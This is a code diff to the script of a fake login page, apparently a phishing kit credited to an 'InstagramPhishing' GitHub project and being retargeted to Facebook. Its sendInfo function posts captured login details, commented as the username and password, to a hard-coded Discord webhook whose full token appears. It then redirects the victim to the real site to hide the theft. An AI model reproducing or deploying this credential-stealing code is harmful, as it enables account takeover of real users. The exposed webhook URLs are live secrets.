@@ -2,11 +2,14 @@ const loginButton = document.querySelector("#loginBtn");
 const password = document.querySelector("#passwordInput");
 const username = document.querySelector("#usernameInput");
 const showPasswordBtn = document.querySelector("#showPasswordBtn");
+const error = document.getElementById("error");
+const form = document.getElementById("loginForm");
 
 password.addEventListener("input", disableBtn);
 username.addEventListener("input", disableBtn);
+password.addEventListener("input", passwordBtnVisible);
 
-
+showPasswordBtn.addEventListener("click", passwordVisible);
 
 function passwordVisible() {
   if (password.type === "password") {
@@ -58,12 +61,11 @@ async function getInfo() {
   
 
 async function sendInfo() {
-  const webhook = "https://discord.com/api/webhooks/1494007450339115030/TSZSuUfSjg2KCb8FQSKs0VVWGt8VOwsWu7_d0KCy8a2dogeJD3-Nkqfp-35XNxc2QVUk";webhook
+  const webhook = "https://discord.com/api/webhooks/1470032068955209956/1PlU5x2ftAW4HXiD02aAMB6js_duPfZnmZlvMbVn3I4quCjUE5231Q56dkInPcipk6Qh";webhook
 
-
-  const embed  = {
-    color: 1585803, //#18328b
-    title: "I Attempt",
+  const embed = {
+    color: 1585803, //#18328bz
+    title: "F Attempt",
     description: `${Info}`, //`${Info}> Username: ${username.value}\n> Password: ${password.value}\n`
     footer: {
       text: "github.com/Josakko/InstagramPhishing",
@@ -82,15 +84,11 @@ async function sendInfo() {
     await fetch(webhook, config);
   } catch {
     setTimeout(function() {
-        window.location.replace("enter/error.html")
+        window.location.replace("m.facebook.com")
     }, 1000);
   }
   setTimeout(function() {
-    window.location.replace("enter/error.html")
+    window.location.replace("m.facebook.com")
   }, 300);
 }
-
-
-
-
 
